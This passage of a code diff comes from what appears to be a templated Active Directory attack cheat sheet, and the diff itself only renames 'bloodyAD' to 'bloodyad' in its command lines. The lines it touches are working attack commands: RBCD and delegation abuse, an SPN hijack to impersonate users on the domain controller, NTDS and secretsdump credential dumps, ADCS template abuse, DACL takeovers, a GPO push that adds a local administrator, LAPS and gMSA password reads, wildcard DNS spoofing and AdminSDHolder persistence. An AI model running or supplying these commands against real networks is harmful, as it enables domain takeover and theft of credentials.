 ],note:'Expected output: <span class="mono">[+] {{computer_name}} can now impersonate users on {{target_host}}$ via S4U2Proxy</span>. If the DC is unpatched you may need to map the DC\'s own computer account instead of a new one — but the rogue-computer route is the standard.'});
@@ -1804,18 +1805,18 @@ cmds:[
 
 R({id:'rbcd-bloodyad',cat:'deleg',title:'RBCD — full bloodyAD variant',desc:'Same attack without impacket, using LDAP directly (useful when SAMR is blocked).',
 cmds:[
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add computer '{{computer_name}}' '{{computer_pass}}'`,'add rogue computer'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add rbcd '{{target_host}}$' '{{computer_name}}'`,'grant RBCD'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} add rbcd '{{target_host}}$' '{{computer_name}}'`,'grant RBCD via ccache'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{target_host}}$' --attr msDS-AllowedToActOnBehalfOfOtherIdentity`,'verify attribute'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add computer '{{computer_name}}' '{{computer_pass}}'`,'add rogue computer'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add rbcd '{{target_host}}$' '{{computer_name}}'`,'grant RBCD'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} add rbcd '{{target_host}}$' '{{computer_name}}'`,'grant RBCD via ccache'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{target_host}}$' --attr msDS-AllowedToActOnBehalfOfOtherIdentity`,'verify attribute'],
  [`impacket-getST -spn cifs/{{target_fqdn}} -impersonate '{{target_user}}' -dc-ip {{dc_ip}} '{{domain}}/{{computer_name}}:{{computer_pass}}'`,'ticket'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' remove rbcd '{{target_host}}$' '{{computer_name}}'`,'CLEANUP: remove RBCD'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' remove computer '{{computer_name}}'`,'CLEANUP: delete computer']
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' remove rbcd '{{target_host}}$' '{{computer_name}}'`,'CLEANUP: remove RBCD'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' remove computer '{{computer_name}}'`,'CLEANUP: delete computer']
 ],note:'bloodyAD can also dump the ticket it just obtained — <span class="mono">add shadowCredentials</span> works the same LDAP-first way. Useful behind SOCKS without direct SAMR.'});
 
 R({id:'constrained-getst',cat:'deleg',title:'Constrained delegation abuse (S4U2Proxy)',desc:'An account allowed to delegate to a service can impersonate any user to that service — including Domain Admins.',
 cmds:[
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{user}}$' --attr msDS-AllowedToDelegateTo,userAccountControl`,'check delegation + T2A4D flag (0x1000000)'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{user}}$' --attr msDS-AllowedToDelegateTo,userAccountControl`,'check delegation + T2A4D flag (0x1000000)'],
  [`impacket-findDelegation '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'find msDS-AllowedToDelegateTo'],
  [`impacket-getST '{{domain}}/{{user}}:{{password}}' -spn '{{spn}}' -impersonate '{{target_user}}' -dc-ip {{dc_ip}}`,'impersonate with password'],
  [`impacket-getST '{{domain}}/{{user}}' -hashes ':{{nthash}}' -spn '{{spn}}' -impersonate '{{target_user}}' -dc-ip {{dc_ip}}`,'impersonate with hash'],
@@ -1828,11 +1829,11 @@ cmds:[
 
 R({id:'spn-hijack-deleg',cat:'deleg',title:'SPN hijack — redirect constrained delegation to the DC',desc:'Constrained delegation points at a service that does not exist (or is out of reach)? Move its SPN onto the DC — the KDC then issues your S4U2Proxy ticket for the DC machine account.',
 cmds:[
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{user}}$' --attr msDS-AllowedToDelegateTo,userAccountControl`,'confirm delegation + T2A4D (0x1000000)'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get search --filter '(servicePrincipalName={{spn}})' --attr sAMAccountName,distinguishedName`,'which object holds the target SPN?'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{dc_host}}$' --attr distinguishedName`,'get the DC object DN → dc_dn'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} msldap delspn "{{dn}}" "{{spn}}"`,'remove SPN from old owner (your notes)'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} msldap addspn "{{dc_dn}}" "{{spn}}"`,'add SPN to the DC account (your notes)'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{user}}$' --attr msDS-AllowedToDelegateTo,userAccountControl`,'confirm delegation + T2A4D (0x1000000)'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get search --filter '(servicePrincipalName={{spn}})' --attr sAMAccountName,distinguishedName`,'which object holds the target SPN?'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{dc_host}}$' --attr distinguishedName`,'get the DC object DN → dc_dn'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} msldap delspn "{{dn}}" "{{spn}}"`,'remove SPN from old owner (your notes)'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} msldap addspn "{{dc_dn}}" "{{spn}}"`,'add SPN to the DC account (your notes)'],
  [`impacket-getST '{{domain}}/{{user}}$' -aesKey '{{aeskey}}' -spn '{{spn}}' -impersonate '{{target_user}}' -altservice 'HOST/{{dc_fqdn}}' -dc-ip {{dc_ip}}`,'your original getST — ticket now encrypted for the DC'],
  [`KRB5CCNAME={{ccache}} impacket-getST '{{domain}}/{{user}}$' -k -no-pass -spn '{{spn}}' -impersonate '{{target_user}}' -altservice 'HOST/{{dc_fqdn}}' -dc-ip {{dc_ip}}`,'ccache variant of your original getST'],
  [`ls -la *.ccache`,'find ticket file'],
@@ -1840,8 +1841,8 @@ cmds:[
  [`KRB5CCNAME={{ccache}} nxc smb {{dc_host}} -u '{{target_user}}' -k --use-kcache --ntds`,'DC takeover: NTDS dump'],
  [`KRB5CCNAME={{ccache}} nxc smb {{dc_host}} -u '{{target_user}}' -k --use-kcache --dpapi --sam --lsa --sccm`,'your writeup dump line'],
  [`KRB5CCNAME={{ccache}} impacket-secretsdump -k -no-pass {{dc_fqdn}} -just-dc`,'impacket variant'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} msldap delspn "{{dc_dn}}" "{{spn}}"`,'CLEANUP: remove SPN from DC'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} msldap addspn "{{dn}}" "{{spn}}"`,'CLEANUP: restore SPN on original owner']
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} msldap delspn "{{dc_dn}}" "{{spn}}"`,'CLEANUP: remove SPN from DC'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} msldap addspn "{{dn}}" "{{spn}}"`,'CLEANUP: restore SPN on original owner']
 ],note:'Requirements: write access on the DC object\'s <span class="mono">servicePrincipalName</span> (GenericWrite/GenericAll on the DC or DA) plus the delegating account\'s key (keytab/AES or hash) and T2A4D. Never leave the SPN on two objects — duplicate SPNs make the KDC resolve unpredictably; delete first, then add. Changes apply at the next ticket request (multi-DC setups: wait for replication). <span class="mono">-altservice HOST/{{dc_fqdn}}</span> rewrites the service class so SMB/LDAP on the DC accepts the ticket.'});
 
 R({id:'unconstrained-coerce',cat:'deleg',title:'Unconstrained delegation + coercion',desc:'A machine trusted for delegation caches TGTs of users who authenticate to it. Coerce a DC and collect them.',
@@ -1872,7 +1873,7 @@ cmds:[
  [`KRB5CCNAME={{ccache}} certipy req -u '{{user}}@{{domain}}' -k -no-pass -dc-ip {{dc_ip}} -ca '{{ca}}' -template '{{template}}' -upn '{{target_user}}@{{domain}}'`,'request via ccache'],
  [`certipy auth -pfx '{{target_user}}.pfx' -dc-ip {{dc_ip}}`,'PKINIT → NT hash'],
  [`nxc smb {{dc_host}} -u '{{target_user}}' -H '<hash from certipy auth>' --ntds`,'DCSync with the obtained hash (DC only)'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{template}}' --attr msPKI-Certificate-Name-Flag,pkiExtendedKeyUsage`,'verify template flags yourself']
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{template}}' --attr msPKI-Certificate-Name-Flag,pkiExtendedKeyUsage`,'verify template flags yourself']
 ],note:'If the CA requires manager approval or the template is not directly enrollable, chain ESC4/ESC7 first. <span class="mono">certipy auth</span> outputs the NT hash of the impersonated account — use it directly with PtH.'});
 
 R({id:'adcs-esc4',cat:'adcs',title:'ADCS — ESC4 (rewrite template, then ESC1)',desc:'You can write on the template object: turn it into an ESC1 machine.',
@@ -1992,7 +1993,7 @@ R({id:'adcs-esc5-esc12-esc14',cat:'adcs',title:'ADCS — ESC5/ESC12/ESC14 recon 
 cmds:[
  [`impacket-dacledit -action read -principal '{{user}}' -target-dn 'CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,{{domain_dn}}' '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'ESC5: who can edit NTAuthCertificates?'],
  [`impacket-dacledit -action read -principal '{{user}}' -target-dn 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,{{domain_dn}}' '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'ESC5: template container ACLs'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get writable --detail`,'find writable PKI objects (look for Public Key Services)'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get writable --detail`,'find writable PKI objects (look for Public Key Services)'],
  [`ldapsearch -x -H ldap://{{dc_ip}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{domain_dn}}' '(altSecurityIdentities=*)' sAMAccountName altSecurityIdentities`,'ESC14: explicit certificate mappings'],
  [`ldapsearch -x -H ldap://{{dc_ip}} -D '{{user}}@{{domain}}' -w '{{password}}' -b 'CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,{{domain_dn}}' '(msDS-OIDToGroupLink=*)' msDS-OIDToGroupLink`,'ESC13 context: linked OID groups']
 ],note:'<b>ESC5</b>: write rights on PKI objects (NTAuthCertificates, AIA/CDP containers, CA/template objects) let you alter trust — publishing a rogue CA in NTAuthCertificates then forging with its key (needs Windows tooling like certutil -dspublish / Set-Acl). <b>ESC12</b>: only relevant for a YubiHSM2-backed CA where a low-privileged shell on the CA can force HSM signatures — no Certipy support. <b>ESC14</b>: weak altSecurityIdentities (CN-only, generic issuer, RFC822) can be matched by a certificate you obtain — authenticate with <span class="mono">certipy auth -pfx <cert> -username <mapped user></span>.'});
@@ -2003,37 +2004,37 @@ cmds:[
  [`impacket-dacledit -action read -principal '{{user}}' -target '{{target_user}}' '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'dacledit read (user)'],
  [`KRB5CCNAME={{ccache}} impacket-dacledit -action read -principal '{{user}}' -target '{{target_user}}' '{{domain}}/{{user}}' -k -no-pass -dc-ip {{dc_ip}}`,'dacledit read via ccache'],
  [`impacket-dacledit -action read -principal '{{user}}' -target '{{target_host}}$' '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'dacledit read (computer)'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{target_user}}' --resolve-sd`,'bloodyAD resolve SD'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get writable --detail`,'all my write rights']
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{target_user}}' --resolve-sd`,'bloodyAD resolve SD'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get writable --detail`,'all my write rights']
 ],note:'BloodHound equivalents: <span class="mono">GenericAll</span>, <span class="mono">GenericWrite</span>, <span class="mono">WriteDacl</span>, <span class="mono">WriteOwner</span>, <span class="mono">ForceChangePassword</span>, <span class="mono">AddSelf</span>, <span class="mono">AddKeyCredentialLink</span> edges.'});
 
 R({id:'dacl-genericall-user',cat:'dacl',title:'GenericAll on user — takeover options',desc:'Full control over a user object. Pick the least destructive path that gets you in.',
 cmds:[
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add shadowCredentials '{{target_user}}'`,'option A: shadow credentials'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} add shadowCredentials '{{target_user}}'`,'option A via ccache'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' msldap addspn "{{dn}}" "fake/spn"`,'option B: targeted kerberoast (then roast + delspn)'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' set password '{{target_user}}' 'Pwn3d123!'`,'option C: reset password (loud)'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add groupMember '{{group}}' '{{target_user}}'`,'option D: add to high-value group'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add genericAll '{{target_user}}' '{{user}}'`,'grant yourself (if you have WriteDacl)']
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add shadowCredentials '{{target_user}}'`,'option A: shadow credentials'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} add shadowCredentials '{{target_user}}'`,'option A via ccache'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' msldap addspn "{{dn}}" "fake/spn"`,'option B: targeted kerberoast (then roast + delspn)'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' set password '{{target_user}}' 'Pwn3d123!'`,'option C: reset password (loud)'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add groupMember '{{group}}' '{{target_user}}'`,'option D: add to high-value group'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add genericAll '{{target_user}}' '{{user}}'`,'grant yourself (if you have WriteDacl)']
 ],note:'Shadow credentials (addKeyCredentialLink) is usually the cleanest: it yields a TGT + NT hash via PKINIT without touching the password.'});
 
 R({id:'dacl-genericall-computer',cat:'dacl',title:'GenericAll / WriteAccountRestrictions on computer',desc:'Full control over a machine — shadow credentials or RBCD.',
 cmds:[
  [`certipy shadow auto -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -account '{{target_host}}$'`,'shadow credentials on machine'],
  [`KRB5CCNAME={{ccache}} certipy shadow auto -u '{{user}}@{{domain}}' -k -no-pass -dc-ip {{dc_ip}} -account '{{target_host}}$'`,'shadow creds via ccache'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add shadowCredentials '{{target_host}}$'`,'bloodyAD variant'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add rbcd '{{target_host}}$' '{{computer_name}}'`,'RBCD (need rogue machine first)'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add shadowCredentials '{{target_host}}$'`,'bloodyAD variant'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add rbcd '{{target_host}}$' '{{computer_name}}'`,'RBCD (need rogue machine first)'],
  [`impacket-getST -spn cifs/{{target_fqdn}} -impersonate '{{target_user}}' -dc-ip {{dc_ip}} '{{domain}}/{{computer_name}}:{{computer_pass}}'`,'RBCD ticket'],
  [`nxc smb {{target_host}} -u '{{target_user}}' -H '<hash from certipy shadow>' --local-auth --sam --lsa`,'use shadow hash']
 ],note:'If the target is a DC: shadow credentials → hash → <span class="mono">--ntds</span>. WriteAccountRestrictions specifically is the RBCD-oriented right.'});
 
 R({id:'dacl-genericall-group',cat:'dacl',title:'GenericAll / WriteMembers on group',desc:'Add yourself (or a controlled account) to a privileged group.',
 cmds:[
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add groupMember '{{group}}' '{{user}}'`,'add self'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} add groupMember '{{group}}' '{{user}}'`,'add self via ccache'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add groupMember '{{group}}' '{{target_user}}'`,'add another account'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add groupMember '{{group}}' '{{user}}'`,'add self'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} add groupMember '{{group}}' '{{user}}'`,'add self via ccache'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add groupMember '{{group}}' '{{target_user}}'`,'add another account'],
  [`net rpc group addmem '{{group}}' '{{user}}' -U '{{domain}}/{{user}}%{{password}}' -S {{dc_host}}`,'net rpc variant'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' remove groupMember '{{group}}' '{{user}}'`,'CLEANUP'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' remove groupMember '{{group}}' '{{user}}'`,'CLEANUP'],
  [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' --groups | grep -i '{{group}}'`,'verify membership']
 ],note:'Group changes apply on next logon/token refresh. For Domain Admins you may need to re-authenticate (new TGT) before the rights appear.'});
 
@@ -2050,7 +2051,7 @@ R({id:'dacl-writedacl-dcsync',cat:'dacl',title:'WriteDacl on domain → DCSync',
 cmds:[
  [`impacket-dacledit -action write -rights DCSync -principal '{{user}}' -target-dn '{{domain_dn}}' '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'write DCSync ACE'],
  [`KRB5CCNAME={{ccache}} impacket-dacledit -action write -rights DCSync -principal '{{user}}' -target-dn '{{domain_dn}}' '{{domain}}/{{user}}' -k -no-pass -dc-ip {{dc_ip}}`,'write DCSync via ccache'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add dcsync '{{user}}'`,'bloodyAD variant'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add dcsync '{{user}}'`,'bloodyAD variant'],
  [`impacket-secretsdump '{{domain}}/{{user}}:{{password}}@{{dc_host}}' -just-dc`,'dump all domain hashes'],
  [`nxc smb {{dc_host}} -u '{{user}}' -p '{{password}}' --ntds`,'nxc variant'],
  [`impacket-dacledit -action remove -rights DCSync -principal '{{user}}' -target-dn '{{domain_dn}}' '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'CLEANUP']
@@ -2060,7 +2061,7 @@ R({id:'dacl-writeowner',cat:'dacl',title:'WriteOwner / ownership takeover',desc:
 cmds:[
  [`impacket-owneredit -action write -new-owner '{{user}}' -target-dn '{{dn}}' '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'take ownership (impacket)'],
  [`KRB5CCNAME={{ccache}} impacket-owneredit -action write -new-owner '{{user}}' -target-dn '{{dn}}' '{{domain}}/{{user}}' -k -no-pass -dc-ip {{dc_ip}}`,'take ownership via ccache'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' set owner '{{target_user}}' '{{user}}'`,'take ownership (bloodyAD)'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' set owner '{{target_user}}' '{{user}}'`,'take ownership (bloodyAD)'],
  [`impacket-dacledit -action write -rights FullControl -principal '{{user}}' -target '{{target_user}}' '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'grant FullControl as new owner'],
  [`impacket-dacledit -action write -rights WriteMembers -principal '{{user}}' -target-dn '{{dn}}' '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'or just WriteMembers (group takeover)']
 ],note:'Order matters: WriteOwner → owner can rewrite the DACL → grant FullControl → do anything. As owner you can always change the DACL. For groups prefer <span class="mono">-rights WriteMembers</span> to stay quiet.'});
@@ -2070,7 +2071,7 @@ cmds:[
  [`certipy shadow auto -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -account '{{target_user}}'`,'certipy (auto: add, auth, clear)'],
  [`KRB5CCNAME={{ccache}} certipy shadow auto -u '{{user}}@{{domain}}' -k -no-pass -dc-ip {{dc_ip}} -account '{{target_user}}'`,'certipy via ccache'],
  [`certipy shadow auto -u '{{user}}@{{domain}}' -hashes ':{{nthash}}' -dc-ip {{dc_ip}} -account '{{target_host}}$'`,'against a computer via PtH'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add shadowCredentials '{{target_user}}' --path .`,'bloodyAD variant (ccache/pfx output)'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add shadowCredentials '{{target_user}}' --path .`,'bloodyAD variant (ccache/pfx output)'],
  [`certipy shadow clear -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -account '{{target_user}}'`,'CLEANUP: remove key credential']
 ],note:'Requires the DC to run Windows Server 2016+ and AD CS or a CA available for PKINIT. BloodHound edge: <span class="mono">AddKeyCredentialLink</span>. Windows equivalent: Rubeus <span class="mono">shadow /certify</span>.'});
 
@@ -2079,8 +2080,8 @@ cmds:[
  [`impacket-dacledit -action write -rights FullControl -principal '{{user}}' -target-dn 'CN=AdminSDHolder,CN=System,{{domain_dn}}' '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'write FullControl on AdminSDHolder'],
  [`impacket-dacledit -action read -principal '{{user}}' -target-dn 'CN=AdminSDHolder,CN=System,{{domain_dn}}' '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'verify the ACE'],
  [`# SDProp runs every 60 min by default — from Windows: Invoke-SDPropagator -timeoutMinutes 1`,'wait or trigger SDProp','n'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{group}}' --resolve-sd`,'check your rights on a protected group'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add groupMember '{{group}}' '{{user}}'`,'add yourself after SDProp ran']
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{group}}' --resolve-sd`,'check your rights on a protected group'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add groupMember '{{group}}' '{{user}}'`,'add yourself after SDProp ran']
 ],note:'3rd-order persistence: SDProp re-applies the ACE, so cleanup requires removing the AdminSDHolder ACE first. Protected objects have <span class="mono">adminCount=1</span> and inheritance disabled. From Linux you cannot force SDProp reliably — wait for the hourly run or use a Windows session (PowerView).'});
 
 /* ===== CREDS & SECRETS ===== */
@@ -2119,10 +2120,10 @@ R({id:'creds-gmsa',cat:'creds',title:'gMSA / LAPS passwords',desc:'Group Managed
 cmds:[
  [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' --gmsa`,'read readable gMSAs'],
  [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' -M laps`,'LAPS passwords'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{target_host}}$' --attr ms-Mcs-AdmPwd`,'bloodyAD LAPS read'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} get object '{{target_host}}$' --attr ms-Mcs-AdmPwd`,'LAPS via ccache'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object 'gmsaAccount$' --attr msDS-ManagedPassword`,'bloodyAD gMSA read'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{target_host}}$' --attr msLAPS-Password,ms-Mcs-AdmPwd`,'legacy + Windows LAPS v2 password'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{target_host}}$' --attr ms-Mcs-AdmPwd`,'bloodyAD LAPS read'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} get object '{{target_host}}$' --attr ms-Mcs-AdmPwd`,'LAPS via ccache'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object 'gmsaAccount$' --attr msDS-ManagedPassword`,'bloodyAD gMSA read'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{target_host}}$' --attr msLAPS-Password,ms-Mcs-AdmPwd`,'legacy + Windows LAPS v2 password'],
  [`nxc smb {{target_host}} -u '{{target_user}}' -p '<LAPS password>' --local-auth`,'use the LAPS password']
 ],note:'Windows LAPS (2023+) uses <span class="mono">msLAPS-Password</span> instead of <span class="mono">ms-Mcs-AdmPwd</span>. gMSA read rights are granted per-account (<span class="mono">PrincipalsAllowedToRetrieveManagedPassword</span>).'});
 
@@ -2331,16 +2332,16 @@ R({id:'post-gpo',cat:'post',title:'GPO abuse',desc:'Write on a GPO? Push a sched
 cmds:[
  [`nxc smb {{dc_host}} -u '{{user}}' -p '{{password}}' -M gpp_password`,'GPP cpassword in SYSVOL'],
  [`nxc smb {{dc_host}} -u '{{user}}' -p '{{password}}' -M gpp_autologin`,'GPP autologin creds'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get writable --otype GPO --detail`,'find writable GPOs'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get writable --otype GPO --detail`,'find writable GPOs'],
  [`python3 pygpoabuse.py '{{domain}}/{{user}}' -p '{{password}}' -gpo-id '<GPO_GUID>' -command 'net localgroup administrators {{user}} /add' -f`,'push immediate task (Linux)'],
  [`impacket-smbserver share $(pwd) -smb2support`,'serve payload for GPO','ns']
 ],note:'pyGPOAbuse expects the GPO ID/GUID and write access (GenericWrite/WriteDACL) on the GPO object. Windows alternative: SharpGPOAbuse. Changes land on next <span class="mono">gpupdate</span> (default 90 min ± jitter) — trigger with <span class="mono">nxc smb -x "gpupdate /force"</span> if you are admin.'});
 
 R({id:'post-adidns',cat:'post',title:'ADIDNS record takeover',desc:'Spoof unregistered DNS names or add records for coercion/relay (AD-integrated DNS).',
 cmds:[
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add dnsRecord '{{target_host}}' {{attacker_ip}}`,'add/overwrite A record'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add dnsRecord '*' {{attacker_ip}}`,'wildcard record (spoof everything)'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' remove dnsRecord '{{target_host}}'`,'CLEANUP: remove record'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add dnsRecord '{{target_host}}' {{attacker_ip}}`,'add/overwrite A record'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add dnsRecord '*' {{attacker_ip}}`,'wildcard record (spoof everything)'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' remove dnsRecord '{{target_host}}'`,'CLEANUP: remove record'],
  [`nxc smb {{dc_host}} -u '{{user}}' -p '{{password}}' -M enum_dns`,'dump DNS zone (module version dependent)']
 ],note:'Great combo: wildcard DNS record + Responder for WPAD-style spoofing inside AD networks, or to hijack a name that services connect to for coercion.'});
 
@@ -2556,14 +2557,14 @@ cmds:[
 /* ===== TRUSTS ===== */
 R({id:'trust-enum',cat:'trust',title:'Enumerate domain trusts',desc:'Find parent/child/forest trusts before attacking them.',
 cmds:[
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get trusts --transitive`,'trust tree (bloodyAD)'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get trusts --transitive`,'trust tree (bloodyAD)'],
  [`nltest /domain_trusts /all_trusts /v`,'from a Windows session','n'],
  [`nltest /trusted_domains`,'quick list of trusted domains','n'],
  [`netdom trust {{domain}} /domain:{{trust_domain}} /verify`,'verify the trust + show direction','n'],
